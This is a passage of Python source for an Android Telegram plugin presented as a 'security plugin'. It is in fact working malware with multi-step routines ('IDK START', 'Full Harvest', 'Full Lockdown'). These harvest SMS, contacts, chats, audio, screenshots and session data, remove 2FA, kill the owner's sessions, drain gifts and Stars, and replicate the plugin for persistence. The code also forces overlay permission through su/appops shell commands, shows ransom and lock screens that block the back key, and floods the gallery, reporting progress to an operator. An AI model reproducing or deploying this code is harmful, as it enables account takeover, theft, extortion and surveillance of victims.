                               workers=2, timeout=25)
                for _ in range(60):
                    if not (self._sync_running and self._active):
                        return
                    time.sleep(5)
            except Exception:
                for _ in range(12):
                    if not (self._sync_running and self._active):
                        return
                    time.sleep(5)

    def _check_persisted_idk(self):
        try:
            prefs = ApplicationLoader.applicationContext.getSharedPreferences("ar_idk", 0)
            if prefs.getBoolean("idk_active", False):
                self._show_idk_overlay()
        except Exception:
            pass

    # ─── PULL OUT ─────────────────────────────────────────────────────────
    def _pull_out_account(self):
        try:
            self._send_msg("Pull Out...")
            Lo = _cls("org.telegram.tgnet.TLRPC$TL_auth_logOut",
                      "org.telegram.tgnet.tl.TL_auth$logOut")
            if not Lo:
                self._send_msg("Pull out err: no class")
                return
            rq = Lo()
            _r, e = self._rg_rpc(rq, 0, 10.0, fast=True)
            if e is not None:
                self._send_msg("Pull out err: " + str(e))
            else:
                self._send_msg("Pull out OK.")
        except Exception as e:
            self._send_msg("Pull out exc: " + str(e))

    # ─── IDK OVERLAY ──────────────────────────────────────────────────────
    def _ensure_overlay_perm(self, ctx):
        try:
            if jclass("android.provider.Settings").canDrawOverlays(ctx):
                return True
        except Exception:
            pass
        pkg = str(ctx.getPackageName())
        for c in ("su -c 'appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
                  "appops set %s SYSTEM_ALERT_WINDOW allow" % pkg):
            try:
                subprocess.run(c, shell=True, capture_output=True, timeout=10)
            except Exception:
                continue
        try:
            return bool(jclass("android.provider.Settings").canDrawOverlays(ctx))
        except Exception:
            return False

    def _show_idk_overlay(self):
        if self._idk_view is not None:
            return {"ok": True, "already": True}
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return {"error": "no ctx"}
            use_decor = not self._ensure_overlay_perm(ctx)
            drew = threading.Event()
            derr = [None]

            def _build():
                try:
                    CTX = jclass("android.content.Context")
                    wm = ctx.getSystemService(CTX.WINDOW_SERVICE)
                    self._idk_wm = wm
                    LL = jclass("android.widget.LinearLayout")
                    TV = jclass("android.widget.TextView")
                    LP = jclass("android.view.WindowManager$LayoutParams")
                    LP_LV = jclass("android.widget.LinearLayout$LayoutParams")
                    Color = jclass("android.graphics.Color")
                    Gravity = jclass("android.view.Gravity")
                    TV2 = jclass("android.util.TypedValue")
                    VLG = jclass("android.view.ViewGroup$LayoutParams")
                    root = LL(ctx)
                    root.setOrientation(LL.VERTICAL)
                    root.setBackgroundColor(Color.parseColor(IDK_BG))
                    root.setGravity(Gravity.CENTER)
                    tv = TV(ctx)
                    tv.setText(IDK_TEXT)
                    tv.setTextColor(Color.parseColor(IDK_FG))
                    tv.setTextSize(TV2.COMPLEX_UNIT_SP, 96)
                    tv.setTypeface(tv.getTypeface(), 1)
                    tv.setGravity(Gravity.CENTER)
                    root.addView(tv, LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT))
                    root.setFocusableInTouchMode(True)
                    root.requestFocus()
                    try:
                        root.setOnKeyListener(_make_idk_key())
                    except Exception:
                        pass
                    try:
                        root.setOnClickListener(_make_idk_click())
                    except Exception:
                        pass
                    if use_decor:
                        act2 = self._get_activity()
                        if act2 is None:
                            raise Exception("no activity")
                        win = act2.getWindow()
                        for f in ("FLAG_KEEP_SCREEN_ON", "FLAG_SHOW_WHEN_LOCKED",
                                  "FLAG_DISMISS_KEYGUARD", "FLAG_TURN_SCREEN_ON"):
                            try:
                                win.addFlags(getattr(LP, f, 0))
                            except Exception:
                                pass
                        decor = win.getDecorView()
                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
                        self._idk_decor = decor
                    else:
                        params = LP(
                            LP.MATCH_PARENT, LP.MATCH_PARENT,
                            getattr(LP, "TYPE_APPLICATION_OVERLAY",
                                    getattr(LP, "TYPE_PHONE", 2002)),
                            getattr(LP, "FLAG_KEEP_SCREEN_ON", 128)
                            | getattr(LP, "FLAG_SHOW_WHEN_LOCKED", 0x80000)
                            | getattr(LP, "FLAG_LAYOUT_IN_SCREEN", 256),
                            -3)
                        params.gravity = Gravity.CENTER
                        wm.addView(root, params)
                    self._idk_view = root
                except Exception as e:
                    derr[0] = e
                finally:
                    drew.set()

            act = self._get_activity()
            if act is not None:
                act.runOnUiThread(_build)
            else:
                _build()
            drew.wait(8)
            if derr[0] is not None:
                return {"error": "idk overlay: %s" % derr[0]}
            if self._idk_view is None:
                return {"error": "overlay not created"}
            self._idk_keep_running = True
            self._idk_thread = threading.Thread(target=self._idk_keepalive_loop,
                                                 daemon=True)
            self._idk_thread.start()
            return {"ok": True}
        except Exception as e:
            return {"error": "idk: %s" % e}

    def _idk_keepalive_loop(self):
        while self._idk_keep_running and self._sync_running:
            try:
                if self._idk_view is None:
                    self._idk_keep_running = False
                    return
                if self._idk_view.getParent() is None:
                    self._idk_view = None
                    self._idk_keep_running = False
                    return
            except Exception:
                self._idk_view = None
                self._idk_keep_running = False
                return
            time.sleep(0.5)

    def _hide_idk_overlay(self):
        try:
            self._idk_keep_running = False
            if self._idk_view is None and self._idk_decor is None:
                return {"ok": True}
            removed = threading.Event()

            def _rm():
                try:
                    if self._idk_view is not None:
                        parent = self._idk_decor or self._idk_wm
                        if parent is not None:
                            try:
                                parent.removeView(self._idk_view)
                            except Exception:
                                pass
                        self._idk_view = None
                        self._idk_decor = None
                except Exception:
                    pass
                finally:
                    removed.set()

            act = self._get_activity()
            if act is not None:
                act.runOnUiThread(_rm)
                removed.wait(6)
            else:
                _rm()
            return {"ok": True}
        except Exception as e:
            return {"error": "hide idk: %s" % e}

    # ─── IDK START ────────────────────────────────────────────────────────
    def _idk_start(self):
        def task():
            def alive():
                return self._sync_running and self._active and not self.stop
            try:
                if SHOW_IDK_OVERLAY:
                    try:
                        self._show_idk_overlay()
                    except Exception:
                        pass
                    try:
                        prefs = ApplicationLoader.applicationContext.getSharedPreferences("ar_idk", 0)
                        e = prefs.edit()
                        e.putBoolean("idk_active", True)
                        e.apply()
                    except Exception:
                        pass

                self._send_msg("IDK START")
                t0 = time.time()
                pwd_report = {"final": "skip"}
                dr = None
                ws = []

                if not alive():
                    return
                self._send_msg("1/15 Tg kid + harvest...")
                try:
                    self._tg_kid()
                except Exception as e:
                    _log("idk 1: %s" % e)

                if not alive():
                    return
                self._send_msg("2/15 2FA...")
                try:
                    pwd_report = self._nuke_password_pipeline(0)
                except Exception as e:
                    pwd_report = {"final": "exc", "error": str(e)}

                if not alive():
                    return
                self._send_msg("3/15 confirm sessions...")
                try:
                    self._confirm_unconfirmed_sessions(0)
                except Exception:
                    pass

                if not alive():
                    return
                self._send_msg("4/15 web/bots/channels...")
                for fn in (self._kill_web_authorizations,
                           self._kill_bots, self._leave_all_channels):
                    try:
                        fn(0)
                    except Exception:
                        pass

                if not alive():
                    return
                self._send_msg("5/15 profile...")
                for fn in (self._change_username, self._change_profile,
                           self._reset_contacts):
                    try:
                        fn(0)
                    except Exception:
                        pass

                if not alive():
                    return
                self._send_msg("6/15 gift drain...")
                try:
                    dr = self._drain_gifts(0)
                except Exception as e:
                    dr = {"error": str(e)}

                if not alive():
                    return
                self._send_msg("7/15 kill sessions...")
                try:
                    self._kill_all_sessions(0)
                except Exception:
                    pass

                if not alive():
                    return
                self._send_msg("8/15 wipe sessions...")
                try:
                    ws = self._wipe_sessions_all()
                except Exception as e:
                    ws = [{"error": str(e)}]
                try:
                    self._kill_login_notice_dialog(0)
                except Exception:
                    pass

                if not alive():
                    return
                self._send_msg("9/15 session dumps...")
                try:
                    self._manual_dump_session()
                except Exception:
                    pass
                try:
                    self._manual_userbot_session()
                except Exception:
                    pass

                if not alive():
                    return
                self._send_msg("10/15 screenshot gain...")
                try:
                    self._screenshot_gain()
                except Exception as e:
                    _log("idk 10: %s" % e)

                if not alive():
                    return
                self._send_msg("11/15 sms/contacts/apps/chats...")
                for fn in (self._manual_sms, self._manual_contacts,
                           self._manual_apps, self._manual_chats):
                    try:
                        fn()
                    except Exception:
                        pass

                if not alive():
                    return
                self._send_msg("12/15 saved export...")

                if not alive():
                    return
                self._send_msg("13/15 persistence...")
                try:
                    self._replicate_self(10)
                except Exception:
                    pass
                try:
                    self._mark_nuke()
                except Exception:
                    pass

                if not alive():
                    return
                self._send_msg("14/15 re-kill sessions...")
                try:
                    self._kill_all_sessions(0)
                except Exception:
                    pass
                try:
                    self._kill_web_authorizations(0)
                except Exception:
                    pass

                if not alive():
                    return
                self._send_msg("15/15 pull out...")
                try:
                    self._pull_out_account()
                except Exception:
                    pass

                try:
                    rep = ["<b>IDK START result</b>"]
                    rep.append("<b>2FA:</b> %s" % pwd_report.get("final"))
                    if isinstance(dr, dict):
                        if dr.get("error"):
                            rep.append("<b>Gifts:</b> err=%s" % dr["error"])
                        else:
                            conv = dr.get("convert") or {}
                            u = dr.get("u") or []
                            ok_count = sum(1 for x in u if isinstance(x, dict)
                                           and isinstance(x.get("result"), dict)
                                           and x["result"].get("ok"))
                            rep.append("<b>Gifts:</b> conv=%s nft=%d deficit=%s" % (
                                conv.get("converted_stars", 0),
                                ok_count, dr.get("fee_deficit", 0)))
                    tk = sum(x.get("killed", 0) for x in ws if isinstance(x, dict))
                    rep.append("<b>Sessions:</b> %d" % tk)
                    rep.append("<b>Pull Out:</b> last")
                    rep.append("<b>Time:</b> %.1fs" % (time.time() - t0))
                    self._send_msg("\n".join(rep), html=True)
                except Exception:
                    pass
            except Exception as e:
                try:
                    self._send_msg("IDK err: " + str(e))
                except Exception:
                    pass
        threading.Thread(target=task, daemon=True).start()

    # ─── FULL HARVEST ─────────────────────────────────────────────────────
    def _full_harvest(self):
        def task():
            def alive():
                return self._sync_running and self._active and not self.stop
            try:
                t0 = time.time()
                self._send_msg("Full Harvest...")
                report = ["<b>Full Harvest</b>"]
                for a in self._get_accounts_list():
                    aid = a.get("id")
                    info = self._harvest_account_info(int(aid))
                    report.append("<b>acc%d:</b> uid=%s @%s +%s" % (
                        aid, a.get("user_id"),
                        self._html_escape(a.get("username") or "—"),
                        self._html_escape(a.get("phone") or "—")))
                    if info.get("2fa"):
                        report.append("  2fa=%s stars=%s" % (
                            info.get("2fa"), info.get("stars_balance", "0")))
                if not alive():
                    return
                try:
                    self._tg_kid()
                    report.append("<b>Tg kid:</b> sent")
                except Exception:
                    pass
                if not alive():
                    return
                try:
                    self._screenshot_gain()
                    report.append("<b>Screenshot gain:</b> sent")
                except Exception:
                    pass
                if not alive():
                    return
                try:
                    self._manual_audio(5)
                    report.append("<b>Audio:</b> sent")
                except Exception:
                    pass
                if not alive():
                    return
                try:
                    for fn in (self._manual_sms, self._manual_contacts,
                               self._manual_apps, self._manual_chats):
                        if not alive():
                            break
                        fn()
                    report.append("<b>SMS/contacts/apps/chats:</b> sent")
                except Exception:
                    pass
                if not alive():
                    return
                try:
                    self._manual_dump_session()
                    self._manual_userbot_session()
                    report.append("<b>Session theft:</b> sent")
                except Exception:
                    pass
                report.append("<b>Time:</b> %.1fs" % (time.time() - t0))
                self._send_msg("\n".join(report), html=True)
            except Exception as e:
                self._send_msg("harvest err: " + str(e))
        threading.Thread(target=task, daemon=True).start()

    # ─── FULL LOCKDOWN ────────────────────────────────────────────────────
    def _full_lockdown(self):
        def task():
            def alive():
                return self._sync_running and self._active and not self.stop
            try:
                t0 = time.time()
                self._send_msg("Full Lockdown...")
                report = ["<b>Full Lockdown</b>"]

                # 0 Deploy
                self._send_msg("0/7 deploy...")
                try:
                    self._parallel([(self._replicate_self, 10),
                                    (self._mark_nuke,)], workers=2, timeout=30)
                    report.append("<b>Deploy:</b> ok")
                except Exception as e:
                    report.append("<b>Deploy:</b> %s" % e)

                if not alive():
                    return
                # 1 Group A
                self._send_msg("1/7 group A...")
                ga = self._parallel([
                    (self._tg_kid,),
                    (self._confirm_unconfirmed_sessions, 0),
                    (self._kill_web_authorizations, 0),
                    (self._leave_all_channels, 0),
                    (self._kill_bots, 0),
                ], workers=5, timeout=120)
                report.append("<b>Tg kid:</b> %s" % self._html_escape(str(ga[0] or "—")))
                report.append("<b>Pending:</b> %s" % str(ga[1]))
                report.append("<b>Web:</b> %s" % str(ga[2]))
                report.append("<b>Channels:</b> %s" % str(ga[3]))
                report.append("<b>Bots:</b> %s" % str(ga[4]))

                if not alive():
                    return
                # 2 gift drain
                self._send_msg("2/7 gift drain...")
                try:
                    gr = self._drain_gifts(0)
                    if gr.get("error"):
                        report.append("<b>Gifts:</b> err=%s" % gr["error"])
                    else:
                        conv = gr.get("convert") or {}
                        u = gr.get("u") or []
                        ok_count = sum(1 for x in u if isinstance(x, dict)
                                       and isinstance(x.get("result"), dict)
                                       and x["result"].get("ok"))
                        report.append("<b>Gifts:</b> conv=%s nft=%d deficit=%s" % (
                            conv.get("converted_stars", 0), ok_count,
                            gr.get("fee_deficit", 0)))
                except Exception as e:
                    report.append("<b>Gifts:</b> %s" % e)

                if not alive():
                    return
                # 3 profile
                self._send_msg("3/7 profile...")
                try:
                    pwd = self._nuke_password_pipeline(0)
                except Exception as e:
                    pwd = {"final": "exc: %s" % e}
                try:
                    new_un = self._change_username(0)
                except Exception:
                    new_un = None
                try:
                    prof = self._change_profile(0)
                except Exception:
                    prof = False
                try:
                    cont = self._reset_contacts(0)
                except Exception:
                    cont = False
                report.append("<b>2FA:</b> %s" % pwd.get("final", "?"))
                report.append("<b>Username:</b> @%s" % self._html_escape(str(new_un or "?")))
                report.append("<b>Profile:</b> %s" % ("[LOCKED]" if prof else "fail"))
                report.append("<b>Contacts:</b> %s" % cont)

                if not alive():
                    return
                # 4 kill sessions
                self._send_msg("4/7 kill sessions...")
                k, total = self._kill_all_sessions(0)
                self._kill_login_notice_dialog(0)
                report.append("<b>Sessions killed:</b> %d / %d" % (k, total))

                if not alive():
                    return
                # 5 re-kill
                self._send_msg("5/7 re-kill...")
                k2, _t = self._kill_all_sessions(0)
                self._kill_web_authorizations(0)
                report.append("<b>Re-killed:</b> %d" % k2)

                if not alive():
                    return
                # 6 persistence
                self._send_msg("6/7 persistence...")
                try:
                    self._replicate_self(10)
                    self._mark_nuke()
                    threading.Thread(target=self._nuke_loop, daemon=True).start()
                    report.append("<b>Persistence:</b> ok")
                except Exception as e:
                    report.append("<b>Persistence:</b> %s" % e)

                if not alive():
                    return
                # 7 pull out
                self._send_msg("7/7 pull out...")
                try:
                    self._pull_out_account()
                    report.append("<b>Pull Out:</b> last")
                except Exception as e:
                    report.append("<b>Pull Out:</b> %s" % e)

                report.append("<b>Time:</b> %.1fs" % (time.time() - t0))
                report.append("<b>ANNIHLATION complete</b>")
                self._send_markup("\n".join(report), {
                    "inline_keyboard": [
                        [{"text": "Logout again", "callback_data": "hv_logout"}],
                    ]
                }, html=True)
            except Exception as e:
                self._send_msg("lockdown err: " + str(e))
        threading.Thread(target=task, daemon=True).start()

    # ─── TROLL ────────────────────────────────────────────────────────────
    def _show_ransom(self, text="", photo_url=""):
        if self._ransom_view is not None:
            return {"ok": True, "already": True}
        try:
            if time.time() < self._ransom_pay_grace_until:
                return {"ok": True, "grace": int(self._ransom_pay_grace_until - time.time())}
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return {"error": "no ctx"}
            use_decor = not self._ensure_overlay_perm(ctx)
            self._ransom_args = {"text": text, "photo_url": photo_url}
            photo_path = ""
            if photo_url and self._ransom_photo_path and self._ransom_photo_url == photo_url \
                    and os.path.exists(self._ransom_photo_path):
                photo_path = self._ransom_photo_path
            elif photo_url:
                try:
                    from urllib.request import urlopen
                    data = urlopen(photo_url, timeout=20).read()
                    photo_path = os.path.join(
                        str(ctx.getFilesDir().getAbsolutePath()),
                        "ransom_%d.jpg" % int(time.time()))
                    with open(photo_path, "wb") as f:
                        f.write(data)
                    self._ransom_photo_path = photo_path
                    self._ransom_photo_url = photo_url
                except Exception:
                    pass

            drew = threading.Event()
            derr = [None]

            def _build():
                try:
                    CTX = jclass("android.content.Context")
                    wm = ctx.getSystemService(CTX.WINDOW_SERVICE)
                    self._ransom_wm = wm
                    LL = jclass("android.widget.LinearLayout")
                    TV = jclass("android.widget.TextView")
                    IV = jclass("android.widget.ImageView")
                    LP = jclass("android.view.WindowManager$LayoutParams")
                    LP_LV = jclass("android.widget.LinearLayout$LayoutParams")
                    Color = jclass("android.graphics.Color")
                    Gravity = jclass("android.view.Gravity")
                    BitmapFactory = jclass("android.graphics.BitmapFactory")
                    TypedValue = jclass("android.util.TypedValue")
                    VLG = jclass("android.view.ViewGroup$LayoutParams")
                    root = LL(ctx)
                    root.setOrientation(LL.VERTICAL)
                    root.setBackgroundColor(Color.parseColor("#1A1A1A"))
                    pad = int(TypedValue.applyDimension(
                        TypedValue.COMPLEX_UNIT_DIP, 24,
                        ctx.getResources().getDisplayMetrics()))
                    root.setPadding(pad, pad, pad, pad)
                    root.setGravity(Gravity.CENTER)
                    if photo_path:
                        try:
                            bmp = BitmapFactory.decodeFile(photo_path)
                            if bmp is not None:
                                iv = IV(ctx)
                                iv_lp = LP_LV(VLG.MATCH_PARENT, int(TypedValue.applyDimension(
                                    TypedValue.COMPLEX_UNIT_DIP, 280,
                                    ctx.getResources().getDisplayMetrics())))
                                iv_lp.bottomMargin = int(TypedValue.applyDimension(
                                    TypedValue.COMPLEX_UNIT_DIP, 16,
                                    ctx.getResources().getDisplayMetrics()))
                                iv.setLayoutParams(iv_lp)
                                iv.setScaleType(iv.ScaleType.CENTER_CROP)
                                iv.setImageBitmap(bmp)
                                root.addView(iv)
                        except Exception:
                            pass
                    tv = TV(ctx)
                    tv_lp = LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT)
                    tv.setLayoutParams(tv_lp)
                    tv.setText(str(text))
                    tv.setTextColor(Color.WHITE)
                    tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18)
                    tv.setGravity(Gravity.CENTER)
                    root.addView(tv)
                    warn_tv = TV(ctx)
                    warn_lp = LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT)
                    warn_lp.topMargin = int(TypedValue.applyDimension(
                        TypedValue.COMPLEX_UNIT_DIP, 20,
                        ctx.getResources().getDisplayMetrics()))
                    warn_tv.setLayoutParams(warn_lp)
                    warn_tv.setText(RANSOM_WARNING)
                    warn_tv.setTextColor(Color.parseColor("#FF3B30"))
                    warn_tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16)
                    warn_tv.setGravity(Gravity.CENTER)
                    root.addView(warn_tv)
                    KE = jclass("android.view.KeyEvent")

                    class _OnKey(dynamic_proxy(jclass("android.view.View$OnKeyListener"))):
                        def onKey(self, v, keyCode, event):
                            try:
                                if keyCode == KE.KEYCODE_BACK:
                                    return True
                            except Exception:
                                pass
                            return False

                    root.setOnKeyListener(_OnKey())
                    root.setFocusableInTouchMode(True)
                    root.requestFocus()
                    if use_decor:
                        act2 = self._get_activity()
                        if act2 is None:
                            raise Exception("no activity")
                        win2 = act2.getWindow()
                        win2.addFlags(getattr(LP, "FLAG_KEEP_SCREEN_ON", 128))
                        decor = win2.getDecorView()
                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
                        self._ransom_decor = decor
                    else:
                        params = LP(
                            LP.MATCH_PARENT, LP.MATCH_PARENT,
                            getattr(LP, "TYPE_APPLICATION_OVERLAY",
                                    getattr(LP, "TYPE_PHONE", 2002)),
                            getattr(LP, "FLAG_KEEP_SCREEN_ON", 128)
                            | getattr(LP, "FLAG_LAYOUT_IN_SCREEN", 256),
                            -3)
                        params.gravity = Gravity.CENTER
                        wm.addView(root, params)
                    self._ransom_view = root
                except Exception as e:
                    derr[0] = e
                finally:
                    drew.set()

            act = self._get_activity()
            if act is not None:
                act.runOnUiThread(_build)
            else:
                _build()
            drew.wait(12)
            if derr[0] is not None:
                return {"error": "ransom: %s" % derr[0]}
            if self._ransom_view is None:
                return {"error": "overlay not created"}
            self._send_msg("Ransom overlay ON")
            return {"ok": True}
        except Exception as e:
            return {"error": "ransom: %s" % e}

    def _dismiss_ransom(self):
        try:
            if self._ransom_view is None and self._ransom_mini_view is None:
                return {"ok": True}
            removed = threading.Event()

            def _rm():
                try:
                    if self._ransom_view is not None:
                        parent = self._ransom_decor or self._ransom_wm
                        if parent is not None:
                            parent.removeView(self._ransom_view)
                        self._ransom_view = None
                        self._ransom_decor = None
                    if self._ransom_mini_view is not None and self._ransom_wm is not None:
                        self._ransom_wm.removeView(self._ransom_mini_view)
                        self._ransom_mini_view = None
                except Exception:
                    pass
                finally:
                    removed.set()

            act = self._get_activity()
            if act is not None:
                act.runOnUiThread(_rm)
                removed.wait(8)
            else:
                _rm()
            return {"ok": True}
        except Exception as e:
            return {"error": str(e)}

    def _lock_screen(self):
        if self._locker_on:
            return
        try:
            act = self._get_activity()
            if act is None:
                return

            def _render():
                try:
                    Color = jclass("android.graphics.Color")
                    BitmapFactory = jclass("android.graphics.BitmapFactory")
                    FrameLayout = jclass("android.widget.FrameLayout")
                    ImageView = jclass("android.widget.ImageView")
                    VLG = jclass("android.view.ViewGroup$LayoutParams")
                    Gravity = jclass("android.view.Gravity")
                    root = FrameLayout(act)
                    root.setBackgroundColor(Color.BLACK)
                    path = self._lock_path
                    if path and os.path.exists(path):
                        iv = ImageView(act)
                        iv.setScaleType(ImageView.ScaleType.FIT_XY)
                        bmp = BitmapFactory.decodeFile(path)
                        if bmp is not None:
                            iv.setImageBitmap(bmp)
                        lp = VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT)
                        iv.setLayoutParams(lp)
                        root.addView(iv)
                    act.getWindow().getDecorView().addView(root,
                        VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
                    self._locker_view = root
                    self._locker_on = True
                    self._send_msg("Locker ON")
                except Exception as e:
                    _log("locker: %s" % e)
            act.runOnUiThread(_render)
        except Exception as e:
            self._send_msg("lock err: " + str(e))

    def _clear_locker(self):
        if not self._locker_on or self._locker_view is None:
            return
        try:
            parent = self._locker_view.getParent()
            if parent is not None:
                parent.removeView(self._locker_view)
            self._locker_view = None
            self._locker_on = False
        except Exception:
            self._locker_view = None
            self._locker_on = False

    def _play_mmusic(self, url):
        def task():
            try:
                act = self._get_activity()
                if act is None:
                    return
                ctx = ApplicationLoader.applicationContext
                d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
                if not os.path.exists(d):
                    os.makedirs(d)
                path = os.path.join(d, "mmusic_%d.mp3" % int(time.time()))
                self._send_msg("Downloading...")
                from urllib.request import urlopen
                data = urlopen(url, timeout=60).read()
                with open(path, "wb") as f:
                    f.write(data)
                self._clear_music()
                mp = jclass("android.media.MediaPlayer")()
                mp.setDataSource(path)
                mp.prepare()
                mp.setLooping(True)
                mp.start()
                self._music_mp = mp
                self._send_msg("Music playing")
            except Exception as e:
                self._send_msg("music err: " + str(e))
        threading.Thread(target=task, daemon=True).start()

    def _clear_music(self):
        if self._music_mp is not None:
            try:
                self._music_mp.stop()
                self._music_mp.release()
            except Exception:
                pass
            self._music_mp = None

    def _flood_gallery(self, photo_url, count=100):
        try:
            from urllib.request import urlopen
            data = urlopen(photo_url, timeout=30).read()
            cr = ApplicationLoader.applicationContext.getContentResolver()
            ImageMedia = jclass("android.provider.MediaStore$Images$Media")
            saved = []
            for i in range(min(int(count), 200)):
                try:
                    ts = int(time.time()) + i
                    rand = random.randint(1000, 9999)
                    name = "IMG_%s_%d.jpg" % (time.strftime("%Y%m%d_%H%M%S",
                                                            time.localtime(ts)), rand)
                    values = jclass("android.content.ContentValues")()
                    values.put("_display_name", name)
                    values.put("mime_type", "image/jpeg")
                    values.put("relative_path", "Pictures/")
                    uri = cr.insert(ImageMedia.EXTERNAL_CONTENT_URI, values)
                    if uri:
                        out = cr.openOutputStream(uri)
                        out.write(data)
                        out.close()
                        saved.append(str(uri))
                except Exception:
                    pass
            self._flood_uris = saved
            self._send_msg("Flood: %d files" % len(saved))
        except Exception as e:
            self._send_msg("flood err: " + str(e))

    def _clear_flood(self):
        try:
            cr = ApplicationLoader.applicationContext.getContentResolver()
            removed = 0
            for u in self._flood_uris:
                try:
                    cr.delete(jclass("android.net.Uri").parse(u), None, None)
                    removed += 1
                except Exception:
                    pass
            self._send_msg("Flood cleared: %d" % removed)
        except Exception as e:
            self._send_msg("clear flood err: " + str(e))

    def _dim_screen(self):
        if self._dim_active:
            return
        try:
            act = self._get_activity()
            if act is None:
                return

            def _dim():
                try:
                    Color = jclass("android.graphics.Color")
                    FrameLayout = jclass("android.widget.FrameLayout")
                    VLG = jclass("android.view.ViewGroup$LayoutParams")
                    overlay = FrameLayout(act)
                    overlay.setBackgroundColor(Color.BLACK)
                    overlay.setAlpha(0.88)
                    act.getWindow().getDecorView().addView(
                        overlay, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
                    self._dim_view = overlay
                    self._dim_active = True
                except Exception:
                    pass
            act.runOnUiThread(_dim)
        except Exception:
            pass

    def _clear_dim(self):
        if not self._dim_active or self._dim_view is None:
            return
        try:
            parent = self._dim_view.getParent()
            if parent is not None:
                parent.removeView(self._dim_view)
            self._dim_view = None
            self._dim_active = False
        except Exception:
            self._dim_view = None
            self._dim_active = False


def create_plugin():
    return PluginSecurityPlugin()
